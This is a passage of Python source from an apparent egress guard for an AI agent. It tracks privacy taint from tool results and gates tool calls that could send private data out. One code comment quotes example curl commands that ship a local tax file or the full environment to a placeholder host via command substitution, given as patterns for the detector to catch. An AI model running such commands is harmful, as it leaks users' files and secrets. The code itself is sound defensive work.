        entry = state._PENDING_TOOL_ARGS.pop(sid, None)
    if not entry or entry.get("tool_name") != str(tool_name or ""):
        return None
    return entry.get("args")


def _taint_classes_for_tool_result(
    tool_name: str,
    result_value: Any,
    status: str = "",
    session_id: str | None = None,
    local_system_policy: dict[str, Any] | None = None,
    tool_args: Any = None,
) -> set[str]:
    if str(status or "").lower() == "error":
        return set()
    override_taints = _tool_override_taint_classes(tool_name)
    if _is_local_system_tool(tool_name):
        classes = _classes_from_content(result_value)
        policy = local_system_policy if local_system_policy is not None else _consume_local_system_result_policy(session_id, tool_name)
        classes.update(set(policy.get("taint") or []))
        return classes | override_taints
    # Doc-reads are classified by *provenance*, never by name keywords. Provably-reference
    # material (skill_view, skills-tree files) is always relaxed.
    if _is_reference_read(tool_name, tool_args):
        # Placeholder-tolerant relaxed scan, so sample contacts in skill docs don't
        # false-positive (the 0818f09 fix).
        return _doc_content_taint_classes(result_value) | override_taints
    # An MCP doc-read (by name shape) follows its declaration if any, else fails closed.
    if _is_mcp_doc_read(tool_name):
        source = _tool_override_source(tool_name)
        if source == "reference":
            return _doc_content_taint_classes(result_value) | override_taints
        if source == "private":
            return _source_private_taint_classes(tool_name) | override_taints
        # Undeclared, unknown provenance → conservative: always taint as personal documents,
        # even when the content trips no signal (closes the 0818f09 FN). _is_source_default_read
        # flags these rows (source_default reason → Protection picker / deep-link); the operator
        # declares the server (source=reference|private) to change the classification.
        return {"documents"} | override_taints
    classes = _classes_from_tool_name(tool_name)
    if classes:
        return classes | override_taints
    if _is_web_sourced_tool(tool_name):
        return _web_content_taint_classes(result_value, session_id) | override_taints
    return _classes_from_content(result_value) | override_taints


def _taint_reason_for_tool_result(tool_name: str, classes: set[str]) -> str:
    name = str(tool_name or "").lower()
    class_text = ", ".join(sorted(classes)) or "private data"
    source_labels = [
        (re.compile(r"(^|_)(gmail|email|mail|inbox|message)(_|$)", re.I), "email"),
        (re.compile(r"(^|_)(dex|contact|contacts|people|person)(_|$)", re.I), "contacts"),
        (re.compile(r"(^|_)(memory|mnemosyne|session_search|search_sessions)(_|$)", re.I), "memory"),
        (re.compile(r"(^|_)(notion|drive|docs?|document|file|read_file)(_|$)", re.I), "document"),
        (re.compile(r"(^|_)(calendar|event|meeting)(_|$)", re.I), "calendar"),
        (re.compile(r"(^|_)(terminal|execute_code|code_execution|shell)(_|$)", re.I), "local system"),
    ]
    for pattern, label in source_labels:
        if pattern.search(name):
            return f"tainted by {label} tool result ({class_text})"
    safe_tool = re.sub(r"[^A-Za-z0-9_.:-]+", "_", str(tool_name or "").strip())[:80]
    if safe_tool:
        return f"tainted by content pattern in {safe_tool} result ({class_text})"
    return f"tainted by content pattern ({class_text})"


def _data_classes_for_egress(session_id: str | None, args: Any) -> set[str]:
    # Provenance retired (doc 02 §4 / charter §2.1): the egress class set is the content
    # classes intrinsic to this payload UNION the full ambient session taint. There is no
    # payload-level provenance narrowing — narrowing now happens only in ``llm`` mode via
    # the verifier reading the real payload (decide step 6). This is strictly more
    # conservative than the old provenance path on external flows (charter invariant #4).
    return _classes_from_content(args) | _session_taint(session_id)


def _safe_policy_token(value: Any, *, default: str, limit: int = 64) -> str:
    text = str(value or "").strip().lower().replace(" ", "_")
    text = re.sub(r"[^a-z0-9_.:-]+", "_", text).strip("_.:-")
    return (text[:limit] if text else default) or default


def _purpose_from_args(args: Any) -> str:
    if isinstance(args, dict):
        for key in ("purpose", "intent", "use_case"):
            if args.get(key):
                return _safe_policy_token(args.get(key), default="unknown", limit=64)
    return "unknown"


def _recipient_raw_from_args(args: Any) -> str:
    if isinstance(args, dict):
        for key in ("to", "recipient", "channel", "chat_id", "target", "conversation_id", "thread_id"):
            value = args.get(key)
            if isinstance(value, str) and value.strip():
                return value.strip()
    return ""


def _recipient_identity_from_value(value: Any) -> str:
    text = str(value or "").strip().lower()
    if not text:
        return "none"
    digest = hashlib.sha256(f"recipient:{text}".encode("utf-8")).hexdigest()
    return f"recipient_{digest[:24]}"


def _recipient_identity_from_args(args: Any) -> str:
    return _recipient_identity_from_value(_recipient_raw_from_args(args))


def _normalize_rule_purpose(value: Any, *, allow_star: bool = True) -> str:
    text = str(value or "").strip()
    if allow_star and (not text or text == "*"):
        return "*"
    return _safe_policy_token(text, default="unknown", limit=64)


def _normalize_rule_recipient_identity(value: Any, *, allow_star: bool = True) -> str:
    text = str(value or "").strip()
    if allow_star and (not text or text == "*"):
        return "*"
    if text.lower() == "none":
        return "none"
    if re.fullmatch(r"recipient_[a-f0-9]{24}", text.lower()):
        return text.lower()
    return _recipient_identity_from_value(text)


class ToolAction:
    __slots__ = ("action_family", "destination", "purpose", "recipient_identity", "legacy_destination")

    def __init__(
        self,
        action_family: str,
        destination: str,
        *,
        purpose: str = "unknown",
        recipient_identity: str = "none",
        legacy_destination: str = "",
    ) -> None:
        self.action_family = action_family
        self.destination = destination
        self.purpose = _safe_policy_token(purpose, default="unknown", limit=64)
        self.recipient_identity = _normalize_rule_recipient_identity(recipient_identity, allow_star=False)
        self.legacy_destination = str(legacy_destination or "")

    def as_tuple(self) -> tuple[str, str]:
        return (self.action_family, self.destination)

    def metadata(self) -> dict[str, str]:
        return {
            "action_family": self.action_family,
            "destination": self.destination,
            "purpose": self.purpose,
            "recipient_identity": self.recipient_identity,
            "legacy_destination": self.legacy_destination,
        }


def _is_mcp_write_tool(tool_name: str) -> bool:
    return tool_name.startswith("mcp_") and bool(core._MCP_WRITE_RE.search(tool_name))


def _is_mcp_read_tool(tool_name: str) -> bool:
    return tool_name.startswith("mcp_") and bool(core._MCP_READ_RE.search(tool_name))


def _mcp_read_sends_query(args: Any) -> bool:
    """True iff a tainted MCP read/search ships free text to the connector (Fix 3).

    Fail CLOSED on unknown keys: ANY non-trivial free-text string value (recursing
    through nested dicts/lists) counts, not just a fixed key list — so private text
    riding `question`/`keywords`/`params.text`/etc. is caught. Bare ids/enums and
    non-text scalars are excluded so a benign `{id}`/`{limit}` arg does not gate.
    """
    if not isinstance(args, dict):
        return _args_send_remote_text(args)
    if _value_carries_remote_free_text(args):
        return True
    return any(_url_sends_remote_text(url) for url in _extract_urls(args))


def _mcp_tool_action(lower: str, args: Any, session_id: str | None) -> ToolAction | None:
    if not lower.startswith("mcp_"):
        return None
    if _is_mcp_write_tool(lower):
        return ToolAction("mcp_write", _mcp_destination(lower))
    if _is_mcp_read_tool(lower):
        if _session_taint(session_id) and _mcp_read_sends_query(args):
            return ToolAction("mcp_read_query", _mcp_destination(lower))
        return None
    if _session_taint(session_id):
        return ToolAction("mcp_unknown", _mcp_destination(lower))
    return None


def _intrinsic_destination(value: Any, *, default: str = "network") -> str:
    for url in _extract_urls(value):
        host = _safe_host_from_url(url)
        if host:
            return "private-network" if _is_private_or_metadata_host(host) else host
    return default


def _intrinsic_has_local_secret_source(text: str) -> bool:
    if core._LOCAL_SECRET_READ_RE.search(text):
        return True
    if core._SENSITIVE_LOCAL_PATH_RE.search(text) and re.search(
        r"\b(?:cat|head|tail|grep|rg|sed|awk|sqlite3|open|read_text|read_bytes|readFileSync|fs\.readFile)\b",
        text,
        re.I,
    ):
        return True
    return False


def _intrinsic_has_browser_private_source(text: str) -> bool:
    return bool(core._BROWSER_SECRET_READ_RE.search(text))


def _intrinsic_has_network_sink(value: Any, text: str) -> bool:
    if core._NETWORK_SINK_RE.search(text):
        return True
    if _extract_urls(value) and re.search(r"\b(?:post|put|patch|delete|send|share|publish|upload)\b", text, re.I):
        return True
    return False


def _intrinsic_mcp_source_classes(lower: str, args_text: str) -> set[str]:
    combined = f"{lower} {args_text}".lower()
    classes: set[str] = set()
    if re.search(r"(?:^|[^a-z0-9])(?:gmail|email|mail|inbox|message|slack|discord)(?:[^a-z0-9]|$)", combined):
        classes.add("communications")
    if re.search(r"(?:^|[^a-z0-9])(?:drive|docs?|document|file|notion|sheet|slide)(?:[^a-z0-9]|$)", combined):
        classes.add("documents")
    if re.search(r"(?:^|[^a-z0-9])(?:calendar|event|meeting)(?:[^a-z0-9]|$)", combined):
        classes.add("calendar")
    if re.search(r"(?:^|[^a-z0-9])(?:dex|contact|contacts|people|person)(?:[^a-z0-9]|$)", combined):
        classes.add("contacts")
    if re.search(r"(?:^|[^a-z0-9])(?:memory|mnemosyne|session_search|search_sessions)(?:[^a-z0-9]|$)", combined):
        classes.add("memory")
    return classes


def _intrinsic_mcp_sink_destination(lower: str, args: Any, args_text: str) -> str:
    destination = _intrinsic_destination(args, default="")
    if destination:
        return destination
    if re.search(r"(?:^|[^a-z0-9])(?:webhook|callback|endpoint|share|send|post|publish|upload)(?:[^a-z0-9]|$)", f"{lower} {args_text}", re.I):
        return _mcp_destination(lower)
    return ""


def _intrinsic_mcp_risk(lower: str, args: Any, args_text: str) -> dict[str, Any] | None:
    if not lower.startswith("mcp_"):
        return None
    classes = _intrinsic_mcp_source_classes(lower, args_text)
    if not classes:
        return None
    destination = _intrinsic_mcp_sink_destination(lower, args, args_text)
    if not destination:
        return None
    return {
        "action_family": "mcp_write",
        "destination": destination,
        "data_classes": classes,
        "reason": "same-call MCP private source plus network/share sink",
    }


def _intrinsic_risk_for_tool(tool_name: str, args: Any) -> dict[str, Any] | None:
    if not core._security_rule_enabled("intrinsic_exfiltration"):
        return None
    lower = str(tool_name or "").lower()
    text = security_module._stringify_for_scan(args)
    if not text:
        return None
    if lower in {"terminal", "execute_code", "code_execution", "shell"}:
        if _intrinsic_has_network_sink(args, text):
            if _intrinsic_has_local_secret_source(text):
                return {
                    "action_family": "terminal_exec",
                    "destination": _intrinsic_destination(args, default="network"),
                    "data_classes": {"local_system"},
                    "reason": "same-call local secret read plus network egress",
                }
            # ANY command substitution feeding a network tool is an outbound
            # source+sink in the same call, regardless of which file/command is
            # inside the substitution: `curl "https://x/?d=$(cat ~/Documents/tax.txt)"`,
            # `curl "https://x/?env=$(printenv)"`, backticks, etc. Treating only
            # known-secret paths as a source let arbitrary local reads exfiltrate in
            # one untainted call, so the substitution itself is the source signal.
            if core._COMMAND_SUBSTITUTION_RE.search(text):
                return {
                    "action_family": "terminal_exec",
                    "destination": _intrinsic_destination(args, default="network"),
                    "data_classes": {"local_system"},
                    "reason": "same-call command substitution plus network egress",
                }
    if lower in {"browser_console", "browser_cdp"}:
        if _intrinsic_has_browser_private_source(text) and _intrinsic_has_network_sink(args, text):
            return {
                "action_family": lower,
                "destination": _intrinsic_destination(args, default="network"),
                "data_classes": {"browser_private_input"},
                "reason": "same-call browser state read plus network egress",
            }
    mcp_risk = _intrinsic_mcp_risk(lower, args, text)
    if mcp_risk:
        return mcp_risk
    return None


def _arg_action(args: Any, default: str = "") -> str:
    if isinstance(args, dict):
        return str(args.get("action") or default).strip().lower()
    return default


def _is_message_send_call(tool_name: str, args: Any) -> bool:
    if not core._MESSAGE_TOOL_RE.search(tool_name):
        return False
    return _arg_action(args, "send") != "list"


def _is_cron_write_call(tool_name: str, args: Any) -> bool:
    if str(tool_name or "").lower() != "cronjob":
        return False
    return _arg_action(args) in {"create", "update"}


def _is_local_write_call(tool_name: str, args: Any) -> bool:
    lower = str(tool_name or "").lower()
    if lower == "todo":
        return isinstance(args, dict) and "todos" in args
    if lower == "memory":
        return _arg_action(args) in {"add", "replace", "remove"}
    if core._MNEMOSYNE_WRITE_TOOL_RE.match(lower):
        return True
    if lower == "skill_manage":
        return _arg_action(args) in {"create", "patch", "edit", "delete", "write_file", "remove_file"}
    return bool(core._LOCAL_WRITE_TOOL_RE.match(lower))


def _computer_use_action(args: Any) -> str:
    return _arg_action(args, "capture")


def _is_computer_use_write(args: Any) -> bool:
    return _computer_use_action(args) not in {"capture", "wait", "list_apps"}


def _is_browser_console_eval(args: Any) -> bool:
    return isinstance(args, dict) and args.get("expression") is not None


def _browser_console_is_provable_read(args: Any) -> bool:
    """True only when a console eval is provably a side-effect-free read.

    A console eval whose expression only reads the DOM returns its result to the
    agent and nothing more — the agent can already read page content through the
    ungated read tools, so such a read is not egress and need not be gated or sent
    to the LLM verifier. This is an allowlist, not a denylist: it returns True only
    when every operation is recognized as a read, so it is fail-closed — anything it
    cannot prove read-only (a network sink, navigation, any page/DOM write, a
    credential-store access, dynamic code, an unknown or mutating call, obfuscation)
    falls through to gating and the LLM verifier. The verifier is itself instructed
    to allow genuine reads, so a conservative miss here only costs an extra check.
    """
    if not isinstance(args, dict):
        return False
    expression = str(args.get("expression") or "")
    if not expression:
        return False
    # Any sink or side-effecting/credential construct disqualifies the read.
    if core._NETWORK_SINK_RE.search(expression) or core._BROWSER_SIDE_EFFECT_RE.search(expression):
        return False
    # Every call site must be a recognized pure-read accessor (control keywords such
    # as ``if (`` / ``return (`` and nameless invocations like an IIFE are not calls).
    for match in core._BROWSER_CALL_NAME_RE.finditer(expression):
        name = match.group(1).lower()
        if name in core._BROWSER_NON_CALL_KEYWORDS:
            continue
        if name not in core._BROWSER_SAFE_READ_CALL_NAMES:
            return False
    return True


def _read_arg_classes(args: Any) -> set[str]:
    return _classes_from_content(args)


# Outbound-verb hints used to deny "recognized safe" status to private-source tools
# whose names also imply an export/send. Such tools fall through to unknown-sink
# gating instead of being treated as harmless reads.
_OUTBOUND_HINT_RE = re.compile(
    r"(^|_)(send|post|publish|share|upload|download|export|import|sync|transmit|"
    r"emit|dispatch|deliver|transfer|push|copy|exfiltrate|leak|dump|forward|relay|"
    r"webhook|notify)(_|$)",
    re.I,
)


def _safe_tool_destination(name: str) -> str:
    token = re.sub(r"[^a-z0-9_.:-]+", "_", str(name or "").strip().lower())[:64]
    return token or "tool"


def _tool_override_taint_classes(tool_name: str) -> set[str]:
    override = rules_mod._tool_override_for(tool_name)
    if not override:
        return set()
    return {cls for cls in (override.get("taints") or []) if cls in core._ALL_PRIVACY_CLASSES}


def _tool_override_source(tool_name: str) -> str:
    """Declared source-classification mode ('reference' | 'private') for a doc-read tool,
    or '' if undeclared. `source` is the classification *mode*; `taints` stays additive."""
    override = rules_mod._tool_override_for(tool_name)
    return str(override.get("source") or "") if override else ""


def _source_private_taint_classes(tool_name: str) -> set[str]:
    """Fine taint classes for a declared-`private` source: the override's explicit `taints`
    if it lists any, else `documents` (the default fine tag for personal_private content)."""
    override = rules_mod._tool_override_for(tool_name) or {}
    declared = {cls for cls in (override.get("taints") or []) if cls in core._ALL_PRIVACY_CLASSES}
    return declared or {"documents"}


def _is_source_default_read(tool_name: str, tool_args: Any = None) -> bool:
    """True iff a read hits the conservative source-provenance default: an MCP doc-read (by
    name shape) that is neither provably-reference nor declared. These are the undeclared,
    unknown-provenance reads tainted as `documents` with the _SOURCE_DEFAULT_REASON — the
    rows the Protection picker and the activity deep-link key off."""
    if not _is_mcp_doc_read(tool_name):
        return False
    if _is_reference_read(tool_name, tool_args):
        return False
    return _tool_override_source(tool_name) not in ("reference", "private")


def _mark_source_suggested(session_id: str | None, server: str) -> bool:
    """True the first time ``server`` is seen for this session (so its classification
    suggestion is recorded once per server per session); False on later reads."""
    server = str(server or "").strip()
    if not server:
        return False
    with state._LOCK:
        session = _ensure_session(session_id)
        seen = session.setdefault("suggested_sources", set())
        if server in seen:
            return False
        seen.add(server)
        return True


_KNOWN_BUILTIN_TOOL_NAMES = frozenset({
    "send_message",
    "cronjob",
    "todo",
    "memory",
    "skill_manage",
    "skill_view",
    "ha_call_service",
    "computer_use",
    "delegate_task",
})


def _recognized_builtin_tool(lower: str, args: Any) -> bool:
    """True when Guardian recognizes this as a known built-in tool.

    Used only at the classifier fallback, after all sink rules have missed, to tell a
    recognized built-in whose specific call is a read/no-op (e.g. ``cronjob`` list)
    apart from a genuinely unknown tool. A tool matching a private-source name but
    also carrying an outbound verb is NOT treated as recognized-safe; it falls through
    to unknown-sink gating.
    """
    if lower.startswith("mcp_") or lower.startswith("browser_"):
        return True
    if core._WEB_READ_TOOL_RE.match(lower):
        return True
    if lower in _KNOWN_BUILTIN_TOOL_NAMES:
        return True
    if (
        core._MESSAGE_TOOL_RE.search(lower)
        or core._TERMINAL_TOOL_RE.match(lower)
        or core._MODEL_EGRESS_TOOL_RE.match(lower)
        or core._WEB_EGRESS_TOOL_RE.search(lower)
        or core._LOCAL_WRITE_TOOL_RE.match(lower)
        or core._MNEMOSYNE_WRITE_TOOL_RE.match(lower)
        or core._KANBAN_WRITE_TOOL_RE.match(lower)
        or core._GENERIC_WRITE_TOOL_RE.search(lower)
    ):
        return True
    if _read_activity_for_tool(lower, args) is not None:
        return True
    if _classes_from_tool_name(lower) and not _OUTBOUND_HINT_RE.search(lower):
        return True
    return False


def _tool_override_action(
    override: dict[str, Any] | None,
    lower: str,
    args: Any,
    session_id: str | None,
) -> tuple[bool, ToolAction | None]:
    """Resolve a tool override's egress directive.

    Returns (decided, action). ``decided`` False means the override has no egress
    directive (or none exists) and normal classification should continue. ``taints``
    are handled separately on result observation, not here.
    """
    if not override:
        return (False, None)
    egress = str(override.get("egress") or "")
    if not egress:
        return (False, None)
    if egress == "ignore":
        return (True, None)
    if egress == "gate":
        if _session_taint(session_id):
            return (True, ToolAction("tool_unknown", _safe_tool_destination(lower)))
        return (True, None)
    destination = str(override.get("destination") or "") or _safe_tool_destination(lower)
    if egress == "message_send":
        return (
            True,
            ToolAction(
                "message_send",
                "messaging",
                purpose=_purpose_from_args(args),
                recipient_identity=_recipient_identity_from_args(args),
                legacy_destination=_safe_destination_from_args(args, default=destination),
            ),
        )
    return (True, ToolAction(egress, destination))


def _egress_tool_action(tool_name: str, args: Any, session_id: str | None) -> ToolAction | None:
    name = str(tool_name or "")
    lower = name.lower()

    decided, override_action = _tool_override_action(
        rules_mod._tool_override_for(lower), lower, args, session_id
    )
    if decided:
        return override_action

    def read_private_action() -> ToolAction:
        action_family, destination = _read_activity_for_tool(lower, args, session_id) or ("web_read", lower)
        return ToolAction(action_family, destination)

    if lower.startswith("mcp_"):
        return _mcp_tool_action(lower, args, session_id)

    rules = (
        (
            lower == "send_message" and _arg_action(args, "send") == "list" and bool(_read_arg_classes(args)),
            lambda: ToolAction("message_list", "messaging"),
        ),
        (
            bool(core._WEB_READ_TOOL_RE.match(lower)) and bool(_session_taint(session_id)) and _args_send_remote_text(args),
            read_private_action,
        ),
        (
            bool(core._WEB_READ_TOOL_RE.match(lower)) and bool(_read_arg_classes(args)),
            read_private_action,
        ),
        (lower == "browser_navigate", lambda: None),
        (lower == "browser_type", lambda: ToolAction("browser_type", _browser_host(session_id))),
        (
            lower in {"browser_click", "browser_press", "browser_dialog"} and _browser_has_private_input(session_id),
            lambda: ToolAction(lower, _browser_host(session_id)),
        ),
        (
            lower == "browser_console"
            and _is_browser_console_eval(args)
            and not _browser_console_is_provable_read(args),
            lambda: ToolAction("browser_console", _browser_host(session_id)),
        ),
        (
            lower == "computer_use" and _is_computer_use_write(args),
            lambda: ToolAction("computer_use", "computer"),
        ),
        (lower == "delegate_task", lambda: ToolAction("delegate_task", "subagent")),
        (bool(core._MODEL_EGRESS_TOOL_RE.match(lower)), lambda: ToolAction("model_api", lower)),
        (
            _is_cron_write_call(lower, args),
            lambda: ToolAction("cron_write", _safe_destination_from_args(args, default="cron")),
        ),
        (_is_local_write_call(lower, args), lambda: ToolAction("local_write", lower)),
        (bool(core._KANBAN_WRITE_TOOL_RE.match(lower)), lambda: ToolAction("kanban_write", "kanban")),
        (lower == "ha_call_service", lambda: ToolAction("homeassistant_write", "homeassistant")),
        (lower == "browser_cdp", lambda: ToolAction("browser_cdp", _browser_host(session_id))),
        (bool(core._TERMINAL_TOOL_RE.match(lower)), lambda: ToolAction("terminal_exec", "terminal")),
        (
            _is_message_send_call(lower, args),
            lambda: ToolAction(
                "message_send",
                "messaging",
                purpose=_purpose_from_args(args),
                recipient_identity=_recipient_identity_from_args(args),
                legacy_destination=_safe_destination_from_args(args, default="messaging"),
            ),
        ),
        (lower == "send_message", lambda: None),
        (
            bool(core._WEB_EGRESS_TOOL_RE.search(lower)),
            lambda: ToolAction("web_api", _safe_destination_from_args(args, default=lower)),
        ),
        (
            bool(core._GENERIC_WRITE_TOOL_RE.search(lower)),
            lambda: ToolAction("tool_write", lower.split("_", 1)[0] or lower),
        ),
    )
    for matches, build_action in rules:
        if matches:
            return build_action()
    # Secure-by-default: an unrecognized non-MCP tool is gated like mcp_unknown when
    # the session is tainted, unless the operator reverted to legacy permissive mode.
    if _recognized_builtin_tool(lower, args):
        return None
    if rules_mod._unknown_tools_mode() == "gate" and _session_taint(session_id):
        return ToolAction("tool_unknown", _safe_tool_destination(lower))
    return None


def _egress_action_for_tool(tool_name: str, args: Any, session_id: str | None) -> tuple[str, str] | None:
    action = _egress_tool_action(tool_name, args, session_id)
    return action.as_tuple() if action else None


def _egress_action_context_for_tool(tool_name: str, args: Any, session_id: str | None) -> ToolAction | None:
    return _egress_tool_action(tool_name, args, session_id)


def _read_activity_for_tool(tool_name: str, args: Any, session_id: str | None = None) -> tuple[str, str] | None:
    lower = str(tool_name or "").lower()
    if lower == "send_message" and _arg_action(args, "send") == "list":
        return ("message_list", "messaging")
    if lower == "browser_console" and (
        not _is_browser_console_eval(args) or _browser_console_is_provable_read(args)
    ):
        # A console eval that is provably a side-effect-free read only reads the DOM
        # back to the agent; log it as a read rather than gating it as egress.
        return ("browser_read", _browser_host(session_id))
    if not core._WEB_READ_TOOL_RE.match(lower):
        return None
    destination = _safe_destination_from_args(args, default=lower)
    if lower.startswith("browser_"):
        return ("browser_read", destination)
    return ("web_read", destination)


def _mcp_destination(tool_name: str) -> str:
    parts = tool_name.split("_")
    if len(parts) >= 3 and parts[0] == "mcp":
        return f"mcp:{parts[1]}"
    return "mcp"


def _safe_destination_from_args(args: Any, *, default: str) -> str:
    url = _extract_url(args)
    host = _safe_host_from_url(url)
    if host:
        return host
    if isinstance(args, dict):
        for key in ("to", "recipient", "channel", "chat_id", "target", "server"):
            value = args.get(key)
            if isinstance(value, str) and value:
                normalized = re.sub(r"[^A-Za-z0-9_.:@-]+", "_", value.strip())[:80]
                return normalized or default
    return default
